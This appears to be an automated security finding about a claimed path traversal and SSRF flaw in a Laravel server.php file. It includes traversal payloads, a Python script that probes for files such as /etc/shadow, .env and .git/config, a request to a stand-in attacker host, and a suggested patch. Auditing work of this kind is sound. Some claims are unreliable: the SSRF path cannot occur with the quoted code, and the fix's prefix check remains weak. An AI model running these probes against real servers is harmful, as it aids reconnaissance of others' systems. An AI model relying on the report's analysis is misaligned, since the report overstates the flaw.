# Path Traversal and SSRF Vulnerability in server.php File Existence Check

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-03-29 18:24:56 UTC
**Target:** /workspace/Platform/server.php
**Endpoint:** server.php (PHP built-in web server entry point)
**Method:** GET
**CWE:** CWE-22
**CVSS:** 7.5

## Description

A path traversal vulnerability was identified in the server.php file at line 17 where user-controlled input from the REQUEST_URI is used without proper validation in the file_exists() function.

The vulnerability occurs in the PHP built-in web server emulation code that checks if static files exist before passing control to the Laravel application. The code takes the REQUEST_URI directly from the server superglobal, URL-decodes it, and uses it to check file existence without any path traversal protection.

This vulnerability allows an attacker to check for the existence of files outside the intended public directory, potentially leading to information disclosure about server file structure and sensitive files. In certain PHP configurations where allow_url_fopen is enabled, this could also lead to server-side request forgery (SSRF) by checking remote URLs.

## Impact

Successful exploitation may allow an attacker to:

- Enumerate files and directories on the server file system
- Confirm existence of sensitive files (configuration files, logs, backups)
- Potentially perform SSRF attacks if allow_url_fopen is enabled
- Gather intelligence about server structure for further attacks

Business impact includes potential information disclosure about server infrastructure, which could be leveraged for more sophisticated attacks against the application.

## Technical Analysis

The vulnerability exists in the PHP built-in web server emulation code. When using PHP's built-in server (php -S), the server.php file handles static file serving before passing requests to the Laravel application.

The security flaw occurs because:
1. User input from $_SERVER['REQUEST_URI'] is taken without validation
2. The input is URL-decoded but not sanitized for path traversal sequences
3. The file_exists() function is called with the user-controlled path appended to the public directory

An attacker can use path traversal sequences (../) to escape the public directory and check for files anywhere on the server that the web server process can access. The function returns false if the file doesn't exist, but timing differences or error handling could reveal file existence information.

## Proof of Concept

To reproduce the vulnerability:

1. Start the PHP built-in web server: php -S localhost:8000 server.php
2. Send requests with path traversal sequences to check file existence:

Example payloads:
- Check for /etc/passwd: GET /../../../../etc/passwd
- Check for .env file: GET /../../../../.env  
- Check for configuration files: GET /../../../../config/database.php

The server will respond differently (or with timing differences) based on whether the file exists, allowing file enumeration.

For SSRF testing (if allow_url_fopen enabled):
- Check remote URL: GET /http://attacker-controlled.com/test

```
import requests
import time

def check_file_existence(base_url, file_path):
    """Check if a file exists using path traversal"""
    # Normalize the path for the traversal attack
    traversal_payload = f"/../../../../{file_path}"
    
    start_time = time.time()
    try:
        response = requests.get(f"{base_url}{traversal_payload}", timeout=10)
        elapsed = time.time() - start_time
        
        # Analyze response for file existence clues
        if response.status_code == 404:
            print(f"File {file_path}: Not found (404)")
        elif response.status_code == 200:
            print(f"File {file_path}: EXISTS (200)")
        else:
            print(f"File {file_path}: Status {response.status_code}, Time: {elapsed:.2f}s")
            
    except requests.exceptions.Timeout:
        print(f"File {file_path}: Timeout (may indicate file exists)")
    except Exception as e:
        print(f"File {file_path}: Error - {e}")

def main():
    base_url = "http://localhost:8000"
    
    # Test for common sensitive files
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow", 
        "/proc/self/environ",
        ".env",
        "config/database.php",
        "storage/logs/laravel.log",
        ".git/config"
    ]
    
    print("Testing path traversal vulnerability...")
    for file_path in sensitive_files:
        check_file_existence(base_url, file_path)

if __name__ == "__main__":
    main()
```

## Code Analysis

**Location 1:** `server.php` (lines 10-12)
  User input from REQUEST_URI without validation (source)
  ```
  $uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);
  ```

**Location 2:** `server.php` (line 17)
  Unsafe file existence check with user input (sink)
  ```
  if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
  ```

  **Suggested Fix:**
```diff
- if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
+ // Validate the URI is within the public directory
+ $fullPath = realpath(__DIR__ . '/public' . $uri);
+ $publicPath = realpath(__DIR__ . '/public');
+ 
+ // Only serve files that are within the public directory
+ if ($uri !== '/' && $fullPath && strpos($fullPath, $publicPath) === 0 && file_exists($fullPath)) {
```

## Remediation

1. Implement proper path validation before using user input in file operations
2. Use realpath() to resolve the full path and check if it's within the intended directory
3. Add a whitelist of allowed file extensions for static file serving
4. Consider using Laravel's built-in static file serving instead of custom PHP server code

Recommended fix for server.php:

```php
$uri = urldecode(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));

// Validate the URI is within the public directory
$fullPath = realpath(__DIR__ . '/public' . $uri);
$publicPath = realpath(__DIR__ . '/public');

// Only serve files that are within the public directory
if ($uri !== '/' && $fullPath && strpos($fullPath, $publicPath) === 0 && file_exists($fullPath)) {
    return false;
}
```

5. For production deployments, use a proper web server (Apache/Nginx) instead of PHP's built-in server
6. Disable allow_url_fopen in php.ini if not required to prevent SSRF via file functions
